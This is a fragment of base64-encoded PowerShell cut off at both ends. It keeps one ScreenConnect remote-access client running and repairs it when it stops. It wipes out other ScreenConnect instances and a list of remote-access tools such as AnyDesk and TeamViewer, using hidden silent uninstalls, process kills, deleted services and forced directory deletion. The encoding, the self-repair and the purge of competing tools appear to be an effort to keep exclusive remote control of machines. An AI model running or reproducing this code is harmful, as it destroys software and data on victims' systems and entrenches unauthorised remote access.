dWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1CgogICAgZm9yZWFjaCAoJGtmcCBpbiAkc2Ny
aXB0OlNldnJ6S2VlcCkgewogICAgICAgICRrbiA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJGtm
cCkiCiAgICAgICAgJiBzYy5leGUgc3RhcnQgJGtuIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIGlm
ICgtbm90IChHZXQtU2VydmljZSAtTmFtZSAka24gLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUpKSB7ICRudWxsID0gUmVwYWlyLVNDU2VydmljZSAka2ZwIH0KICAgIH0KCiAgICBpZiAoLW5v
dCAoVGVzdC1TY1J1bm5pbmcgJG5ld0ZwKSkgeyAkbnVsbCA9IFJlcGFpci1TQ1NlcnZpY2UgJG5l
d0ZwIH0KCiAgICBpZiAoVGVzdC1TY1J1bm5pbmcgJG5ld0ZwKSB7CiAgICAgICAgR0xvZyAncG9z
dF9ydW5uaW5nX29rJwogICAgICAgIHJldHVybiAiSEVBTFRIWXwkbmV3RnB8aW5zdGFsbGVkPTEi
CiAgICB9CiAgICBHTG9nICdwb3N0X3N0aWxsX2Rvd24nCiAgICByZXR1cm4gIlVOSEVBTFRIWXwk
bmV3RnB8c3RpbGwtbm90LXJ1bm5pbmciCn0KCmZ1bmN0aW9uIEludm9rZS1FeHRlcm1pbmF0ZSB7
CiAgICAjIEw3OiB0cnVlIHJlbW92YWwuIENvcnJlY3QgV09XNjQzMk5vZGUgaGl2ZSArIG1zaWV4
ZWMgKyBVbmluc3RhbGxTdHJpbmcKICAgICMgZmFsbGJhY2sgKyBmb3JjZSBkaXIgbnVrZS4gS2Vl
cCBzZXZyeithbHQrY3VycmVudCBncnl4YSBGUCAoZ3J5eGEuY2ZnKS4KICAgICMgTzQxOiBzeW5j
IFJ1bm5pbmcgR3J5eGEgRlAgaW50byBjZmcgQkVGT1JFIGFueSBraWxsOyBuZXZlciBraWxsIFND
IHByb2NzCiAgICAjIHdpdGhvdXQgYSBmb3JlaWduIEZQIGluIHBhdGgvY21kbGluZSAobnVsbCBw
YXRoIHdhcyBraWxsaW5nIEdyeXhhIGV2ZXJ5IHRpY2spLgogICAgJGxvZyA9IEpvaW4tUGF0aCAk
V29ya0RpciAnZXh0ZXJtaW5hdGUubG9nJwogICAgJHJ1bm5pbmdHID0gRmluZC1SdW5uaW5nR3J5
eGFGcAogICAgaWYgKCRydW5uaW5nRykgeyBTZXQtR3J5eGFGcCAkcnVubmluZ0cgfQogICAgJGtl
ZXAgPSBAKEdldC1LZWVwRmluZ2VycHJpbnRzKQogICAgJG4gPSBAeyBzdmMgPSAwOyBwcm9jID0g
MDsgZGlyID0gMDsgcHJvZHVjdCA9IDA7IHJtbSA9IDA7IGZhaWwgPSAwIH0KICAgIGZ1bmN0aW9u
IExvZyhbc3RyaW5nXSRtKSB7CiAgICAgICAgJGxpbmUgPSAnezB9IHsxfScgLWYgKEdldC1EYXRl
IC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0KICAgICAgICBBZGQtQ29udGVudCAt
TGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgJGxpbmUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgICAgICAjIE80MTogZG8gTk9UIFdyaXRlLU91dHB1dCBMb2cgbGluZXMgKHBvbGx1dGVz
IGZvciAvZiBjYWxsZXJzKQogICAgfQogICAgIyBQcm90ZWN0IEdyeXhhIGR1cmluZyBzdGFydCBy
YWNlOiBhbnkgbGl2ZSBTQyBwcm9jZXNzIHdob3NlIHBhdGggZW1iZWRzIGEKICAgICMgbm9uLXNl
dnJ6IEZQIGlzIGEga2VlcGVyIGV2ZW4gaWYgdGhlIHNlcnZpY2UgaXMgbm90IFJ1bm5pbmcgeWV0
LgogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtlICdT
Y3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1P
YmplY3QgewogICAgICAgICRibG9iID0gIiQoW3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aCkgJChb
c3RyaW5nXSRfLkNvbW1hbmRMaW5lKSIKICAgICAgICBpZiAoJGJsb2IgLW1hdGNoICdTY3JlZW5D
b25uZWN0IENsaWVudCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7CiAgICAgICAgICAgICRmcCA9
ICRNYXRjaGVzWzFdLlRvTG93ZXIoKQogICAgICAgICAgICBpZiAoJGZwIC1ub3RpbiAkc2NyaXB0
OlNldnJ6S2VlcCAtYW5kICRmcCAtbm90aW4gJGtlZXApIHsKICAgICAgICAgICAgICAgICRrZWVw
ICs9ICRmcAogICAgICAgICAgICAgICAgU2V0LUdyeXhhRnAgJGZwCiAgICAgICAgICAgICAgICBM
b2cgImtlZXBfYWRkX2Zyb21fcHJvYyBmcD0kZnAiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAg
ICB9CiAgICBmdW5jdGlvbiBJcy1LZWVwZXIoW3N0cmluZ10kcykgewogICAgICAgIGlmICgtbm90
ICRzKSB7IHJldHVybiAkZmFsc2UgfQogICAgICAgIGZvcmVhY2ggKCRrIGluICRrZWVwKSB7IGlm
ICgkcyAtbGlrZSAiKiRrKiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAgIHJldHVybiAkZmFs
c2UKICAgIH0KICAgIGZ1bmN0aW9uIEZvcmNlLVJlbW92ZURpcihbc3RyaW5nXSRkKSB7CiAgICAg
ICAgaWYgKC1ub3QgJGQgLW9yIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IHJl
dHVybiAkdHJ1ZSB9CiAgICAgICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5F
eGVjdXRhYmxlUGF0aCAtYW5kICRfLkV4ZWN1dGFibGVQYXRoLlN0YXJ0c1dpdGgoJGQsIFtTdHJp
bmdDb21wYXJpc29uXTo6T3JkaW5hbElnbm9yZUNhc2UpIH0gfAogICAgICAgICAgICBGb3JFYWNo
LU9iamVjdCB7IFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rp
b24gU2lsZW50bHlDb250aW51ZSB9CiAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAkZCAvUiAvRCBZ
IDI+JjEgfCBPdXQtTnVsbAogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJypTLTEtNS0z
Mi01NDQ6RicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBpY2FjbHMuZXhlICRk
IC9ncmFudCAnQWRtaW5pc3RyYXRvcnM6RicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsCiAgICAg
ICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rp
b24gU2lsZW50bHlDb250aW51ZQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRk
KSB7CiAgICAgICAgICAgIGNtZC5leGUgL2MgImF0dHJpYiAtaCAtcyAtciAvcyAvZCBgIiRkXCou
KmAiIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgY21kLmV4ZSAvYyAicm1kaXIgL3MgL3Eg
YCIkZGAiIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICB9CiAgICAgICAgaWYgKFRlc3QtUGF0aCAt
TGl0ZXJhbFBhdGggJGQpIHsKICAgICAgICAgICAgJGVtcHR5ID0gSm9pbi1QYXRoICRlbnY6VEVN
UCAoIm93bl9lbXB0eV8iICsgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkKICAgICAg
ICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkZW1wdHkgLUZvcmNlIHwg
T3V0LU51bGwKICAgICAgICAgICAgJiByb2JvY29weS5leGUgJGVtcHR5ICRkIC9NSVIgL1I6MCAv
VzowIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGgg
JGVtcHR5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICBS
ZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlCiAgICAgICAgfQogICAgICAgIHJldHVybiAtbm90IChUZXN0LVBhdGgg
LUxpdGVyYWxQYXRoICRkKQogICAgfQogICAgZnVuY3Rpb24gVW5pbnN0YWxsLVByb2R1Y3RLZXko
JGtleSkgewogICAgICAgICRndWlkID0gJGtleS5QU0NoaWxkTmFtZQogICAgICAgICRwcm9wID0g
R2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgICAgICRkbiA9ICRwcm9wLkRpc3BsYXlOYW1lCiAgICAgICAgaWYgKCRndWlkIC1saWtl
ICd7Kn0nKSB7CiAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJn
dW1lbnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJlc3Mi
IC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgIExvZyAicHJv
ZHVjdF9tc2lleGVjIFskZG5dIGd1aWQ9JGd1aWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAg
ICAgICAgaWYgKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKSB7IHJldHVybiAk
dHJ1ZSB9CiAgICAgICAgfQogICAgICAgICR1cyA9ICRwcm9wLlVuaW5zdGFsbFN0cmluZwogICAg
ICAgIGlmICgkdXMpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICgkdXMg
LW1hdGNoICcoP2kpbXNpZXhlYycpIHsKICAgICAgICAgICAgICAgICAgICAkYXJncyA9ICgkdXMg
LXJlcGxhY2UgJyg/aSleLiptc2lleGVjKFwuZXhlKT9ccyonLCAnJykKICAgICAgICAgICAgICAg
ICAgICBpZiAoJGFyZ3MgLW5vdG1hdGNoICcvcW4nKSB7ICRhcmdzID0gIiRhcmdzIC9xbiAvbm9y
ZXN0YXJ0IiB9CiAgICAgICAgICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMu
ZXhlIC1Bcmd1bWVudExpc3QgJGFyZ3MgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRk
ZW4KICAgICAgICAgICAgICAgICAgICBMb2cgInByb2R1Y3RfdW5pbnN0YWxsc3RyaW5nX21zaSBb
JGRuXSBleGl0PSQoJHAuRXhpdENvZGUpIgogICAgICAgICAgICAgICAgICAgIHJldHVybiAoJHAu
RXhpdENvZGUgLWluIDAsIDE2MDUsIDE2MTQsIDMwMTApCiAgICAgICAgICAgICAgICB9IGVsc2Ug
ewogICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBjbWQuZXhlIC1Bcmd1bWVu
dExpc3QgIi9jICR1cyAvUyAvc2lsZW50IC9xdWlldCAvcW4iIC1XYWl0IC1QYXNzVGhydSAtV2lu
ZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAgTG9nICJwcm9kdWN0X3VuaW5zdGFs
bHN0cmluZ19leGUgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAgICAgICAgICAgICAg
ICByZXR1cm4gKCRwLkV4aXRDb2RlIC1lcSAwKQogICAgICAgICAgICAgICAgfQogICAgICAgICAg
ICB9IGNhdGNoIHsgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19GQUlMIFskZG5dICRfIiB9
CiAgICAgICAgfQogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KCiAgICBMb2cgJ2V4dGVybWlu
YXRlX2VuZ2luZV9MN19iZWdpbicKCiAgICAjIDEuIGZvcmVpZ24gU0MgcHJvZHVjdHMgZnJvbSBC
T1RIIGNvcnJlY3QgQVJQIGhpdmVzCiAgICAkc2VlbiA9IEB7fQogICAgZm9yZWFjaCAoJHJvb3Qg
aW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGgg
JHJvb3QpKSB7IExvZyAiaGl2ZV9taXNzaW5nICRyb290IjsgY29udGludWUgfQogICAgICAgIExv
ZyAiaGl2ZV9zY2FuICRyb290IgogICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRwcm9w
ID0gR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgICAgICAgICAgJGRuID0gJHByb3AuRGlzcGxheU5hbWUKICAgICAgICAgICAgaWYgKC1u
b3QgJGRuKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkZG4gLW5vdG1hdGNoICcoP2kpU2Ny
ZWVuQ29ubmVjdFxzK0NsaWVudFxzKlwoKFswLTlBLUZhLWZdezE2fSlcKScpIHsgcmV0dXJuIH0K
ICAgICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAgICAgICAgIGlmICgk
ZnAgLWluICRrZWVwKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tl
eSgkXy5QU0NoaWxkTmFtZSkpIHsgcmV0dXJuIH0KICAgICAgICAgICAgJHNlZW5bJF8uUFNDaGls
ZE5hbWVdID0gJHRydWUKICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9kdWN0S2V5ICRfKSB7
ICRuLnByb2R1Y3QrKyB9IGVsc2UgeyAkbi5mYWlsKys7IExvZyAicHJvZHVjdF9SRU1PVkVfRkFJ
TEVEIFskZG5dIiB9CiAgICAgICAgfQogICAgfQoKICAgICMgMi4gZm9yZWlnbiBTQyBzZXJ2aWNl
cwogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0IENs
aWVudConIH0pKSB7CiAgICAgICAgaWYgKElzLUtlZXBlciAkc3ZjLk5hbWUpIHsgY29udGludWUg
fQogICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAg
ICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA2MDAKICAgICAgICAmIHNjLmV4ZSBkZWxl
dGUgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJG4uc3ZjKys7IExvZyAi
c3ZjX2RlbGV0ZWQgJCgkc3ZjLk5hbWUpIgogICAgfQoKICAgICMgMy4gZm9yZWlnbiBTQyBwcm9j
ZXNzZXMg4oCUIE9OTFkgaWYgcGF0aC9jbWRsaW5lIGVtYmVkcyBhIE5PTi1rZWVwZXIgRlAuCiAg
ICAjIE80MTogbnVsbCBFeGVjdXRhYmxlUGF0aCB1c2VkIHRvIGtpbGwgR3J5eGEgQ2xpZW50U2Vy
dmljZSBldmVyeSB0aWNrIOKGkiByZWluc3RhbGwgbG9vcC4KICAgIEdldC1DaW1JbnN0YW5jZSBX
aW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWUgbGlrZSAnU2NyZWVuQ29ubmVjdCUnIiAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZXhlID0g
W3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aAogICAgICAgICRjbWQgPSBbc3RyaW5nXSRfLkNvbW1h
bmRMaW5lCiAgICAgICAgJGJsb2IgPSAiJGV4ZSAkY21kIgogICAgICAgIGlmIChJcy1LZWVwZXIg
JGJsb2IpIHsgcmV0dXJuIH0KICAgICAgICBpZiAoJGJsb2IgLW5vdG1hdGNoICdcKChbMC05YS1m
QS1GXXsxNn0pXCknKSB7CiAgICAgICAgICAgIExvZyAicHJvY19za2lwX25vX2ZwIHBpZD0kKCRf
LlByb2Nlc3NJZCkgbmFtZT0kKCRfLk5hbWUpIgogICAgICAgICAgICByZXR1cm4KICAgICAgICB9
CiAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAgICAgaWYgKCRmcCAtaW4g
JGtlZXApIHsgcmV0dXJuIH0KICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAt
Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAkbi5wcm9jKys7IExv
ZyAicHJvY19raWxsZWQgcGlkPSQoJF8uUHJvY2Vzc0lkKSBmcD0kZnAgZXhlPSRleGUiCiAgICB9
CgogICAgIyA0LiBmb3JlaWduIFNDIGluc3RhbGwgZGlycyAoUEYgKyBQRjg2KQogICAgZm9yZWFj
aCAoJGJhc2UgaW4gQCgkZW52OlByb2dyYW1GaWxlcywgJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
KSkgewogICAgICAgIGlmICgtbm90ICRiYXNlIC1vciAtbm90IChUZXN0LVBhdGggJGJhc2UpKSB7
IGNvbnRpbnVlIH0KICAgICAgICBHZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkYmFzZSAtRGly
ZWN0b3J5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAg
IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QqJyB9IHwgRm9yRWFj
aC1PYmplY3QgewogICAgICAgICAgICAgICAgJGQgPSAkXy5GdWxsTmFtZQogICAgICAgICAgICAg
ICAgaWYgKElzLUtlZXBlciAkZCkgeyByZXR1cm4gfQogICAgICAgICAgICAgICAgaWYgKEZvcmNl
LVJlbW92ZURpciAkZCkgeyAkbi5kaXIrKzsgTG9nICJkaXJfcmVtb3ZlZCAkZCIgfQogICAgICAg
ICAgICAgICAgZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJkaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfQog
ICAgICAgICAgICB9CiAgICB9CgogICAgIyA1LiBkaXNhbGxvd2VkIFJNTSAvIHJlbW90ZS1hY2Nl
c3MgdG9vbHMgKG1hcmtldCBjb3ZlcmFnZSAyMDI2KS4KICAgICMgS0VFUCBmb3JldmVyOiBEYXR0
by9DZW50cmFTdGFnZSArIFNjcmVlbkNvbm5lY3Qga2VlcCBGUHMgKGhhbmRsZWQgYWJvdmUpLgog
ICAgIyBORVZFUiBwdXQgRGF0dG8vQ2VudHJhU3RhZ2UvQ2FnU2VydmljZSBpbiB0aGlzIGxpc3Qu
CiAgICBmdW5jdGlvbiBJcy1EYXR0b0tlZXBlcihbc3RyaW5nXSRzKSB7CiAgICAgICAgaWYgKC1u
b3QgJHMpIHsgcmV0dXJuICRmYWxzZSB9CiAgICAgICAgcmV0dXJuIFtib29sXSgkcyAtbWF0Y2gg
Jyg/aSlEYXR0b3xDZW50cmFTdGFnZXxDYWdTZXJ2aWNlfEF1dG90YXNrRW5kcG9pbnQnKQogICAg
fQogICAgJHJtbSA9IEAoCiAgICAgICAgQHsgVGFnPSdBbnlEZXNrJzsgICAgICBTdmM9QCgnQW55
RGVzaycpOyBQcm9jPUAoJ0FueURlc2snKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBbnlE
ZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFueURlc2siLCIkZW52OlByb2dyYW1EYXRh
XEFueURlc2siKTsgUHJvZD1AKCdBbnlEZXNrKicpIH0KICAgICAgICBAeyBUYWc9J1RlYW1WaWV3
ZXInOyAgIFN2Yz1AKCdUZWFtVmlld2VyKicpOyBQcm9jPUAoJ1RlYW1WaWV3ZXIqJywndHZfdzMy
KicsJ3R2X3g2NConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUZWFtVmlld2VyIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRlYW1WaWV3ZXIiKTsgUHJvZD1AKCdUZWFtVmlld2VyKicp
IH0KICAgICAgICBAeyBUYWc9J1NwbGFzaHRvcCc7ICAgIFN2Yz1AKCdTcGxhc2h0b3AqJywnU1JT
ZXJ2aWNlJywnU1NVU2VydmljZScpOyBQcm9jPUAoJ1NwbGFzaHRvcConLCdzdHJ3aW5jbHQqJywn
U1JNYW5hZ2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNwbGFzaHRvcCIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdTcGxhc2h0b3AqJykgfQog
ICAgICAgIEB7IFRhZz0nTG9nTWVJbic7ICAgICAgU3ZjPUAoJ0xvZ01lSW4nLCdMTUlHdWFyZGlh
blN2YycsJ0xNSWlnbml0aW9uJyk7IFByb2M9QCgnTG9nTWVJbionLCdMTUlHdWFyZGlhbionLCdS
YVNlcnZlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMb2dNZUluIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XExvZ01lSW4iKTsgUHJvZD1AKCdMb2dNZUluKicpIH0KICAgICAgICBA
eyBUYWc9J0dvVG8nOyAgICAgICAgIFN2Yz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ0dv
VG9SZXNvbHZlKicpOyBQcm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnZzJtKicsJ0dv
VG9SZXNvbHZlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvVG9NeVBDIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XEdvVG9NeVBDIik7IFByb2Q9QCgnR29Ub015UEMqJywnR29Ub0Fz
c2lzdConLCdHb1RvIFJlc29sdmUqJywnR29Ub01lZXRpbmcqJywnR29UbyBDb25uZWN0KicpIH0K
ICAgICAgICBAeyBUYWc9J1J1c3REZXNrJzsgICAgIFN2Yz1AKCdSdXN0RGVzaycsJ3J1c3RkZXNr
KicpOyBQcm9jPUAoJ3J1c3RkZXNrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJ1c3RE
ZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJ1c3REZXNrIik7IFByb2Q9QCgnUnVzdERl
c2sqJykgfQogICAgICAgIEB7IFRhZz0nU3VwcmVtbyc7ICAgICAgU3ZjPUAoJ1N1cHJlbW8qJyk7
IFByb2M9QCgnU3VwcmVtbyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTdXByZW1vIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cHJlbW8iKTsgUHJvZD1AKCdTdXByZW1vKicpIH0K
ICAgICAgICBAeyBUYWc9J0RXU2VydmljZSc7ICAgIFN2Yz1AKCdEV0FnZW50JywnZHdhZ2VudCon
KTsgUHJvYz1AKCdkd2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERXQWdlbnQi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRFdBZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcRFdB
Z2VudCIpOyBQcm9kPUAoJ0RXQWdlbnQqJywnRFdTZXJ2aWNlKicpIH0KICAgICAgICBAeyBUYWc9
J1pvaG9Bc3Npc3QnOyAgIFN2Yz1AKCdab2hvQXNzaXN0KicsJ1pvaG9NZWV0aW5nKicpOyBQcm9j
PUAoJ1pvaG9Bc3Npc3QqJywnWm9ob1VSU0IqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
Wm9ob01lZXRpbmciLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cWm9ob01lZXRpbmciKTsgUHJv
ZD1AKCdab2hvIEFzc2lzdConLCdab2hvTWVldGluZyonKSB9CiAgICAgICAgQHsgVGFnPSdSZW1v
dGVQQyc7ICAgICBTdmM9QCgnUmVtb3RlUEMqJyk7IFByb2M9QCgnUmVtb3RlUEMqJywnUlBDU3Vp
dGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVtb3RlUEMiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cUmVtb3RlUEMiKTsgUHJvZD1AKCdSZW1vdGVQQyonKSB9CiAgICAgICAgQHsg
VGFnPSdCb21nYXInOyAgICAgICBTdmM9QCgnYm9tZ2FyKicsJ0JleW9uZFRydXN0KicpOyBQcm9j
PUAoJ2JvbWdhcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xCb21nYXIiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cQm9tZ2FyIiwiJGVudjpQcm9ncmFtRmlsZXNcQmV5b25kVHJ1c3Qi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQmV5b25kVHJ1c3QiKTsgUHJvZD1AKCdCb21nYXIq
JywnQmV5b25kVHJ1c3QqJykgfQogICAgICAgIEB7IFRhZz0nUGFyc2VjJzsgICAgICAgU3ZjPUAo
J1BhcnNlYyonKTsgUHJvYz1AKCdwYXJzZWNkKicsJ3BzZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXFBhcnNlYyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQYXJzZWMiLCIk
ZW52OlByb2dyYW1EYXRhXFBhcnNlYyIpOyBQcm9kPUAoJ1BhcnNlYyonKSB9CiAgICAgICAgQHsg
VGFnPSdDaHJvbWVSRCc7ICAgICBTdmM9QCgnY2hyb21vdGluZyonKTsgUHJvYz1AKCdyZW1vdGlu
Z19ob3N0KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvb2dsZVxDaHJvbWUgUmVtb3Rl
IERlc2t0b3AiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR29vZ2xlXENocm9tZSBSZW1vdGUg
RGVza3RvcCIpOyBQcm9kPUAoJ0Nocm9tZSBSZW1vdGUgRGVza3RvcConKSB9CiAgICAgICAgQHsg
VGFnPSdVbHRyYVZOQyc7ICAgICBTdmM9QCgndXZuYyonLCd3aW52bmMqJyk7IFByb2M9QCgnd2lu
dm5jKicsJ3V2bmMqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVWx0cmFWTkMiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cVWx0cmFWTkMiKTsgUHJvZD1AKCdVbHRyYVZOQyonLCdXaW5W
TkMqJykgfQogICAgICAgIEB7IFRhZz0nVGlnaHRWTkMnOyAgICAgU3ZjPUAoJ3R2bnNlcnZlcion
KTsgUHJvYz1AKCd0dm5zZXJ2ZXIqJywndHZudmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXFRpZ2h0Vk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRpZ2h0Vk5DIik7IFBy
b2Q9QCgnVGlnaHRWTkMqJykgfQogICAgICAgIEB7IFRhZz0nUmVhbFZOQyc7ICAgICAgU3ZjPUAo
J3ZuY3NlcnZlcionKTsgUHJvYz1AKCd2bmNzZXJ2ZXIqJywndm5jdmlld2VyKicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXFJlYWxWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVh
bFZOQyIpOyBQcm9kPUAoJ1ZOQyBTZXJ2ZXIqJywnUmVhbFZOQyonKSB9CiAgICAgICAgQHsgVGFn
PSdEYW1lV2FyZSc7ICAgICBTdmM9QCgnRGFtZVdhcmUqJyk7IFByb2M9QCgnRFdSQ1MqJywnRFdS
Q0MqJywnRGFtZVdhcmUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU29sYXJXaW5kcyIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTb2xhcldpbmRzIiwiJGVudjpQcm9ncmFtRmlsZXNc
RGFtZVdhcmUgUmVtb3RlIFN1cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRGFtZVdh
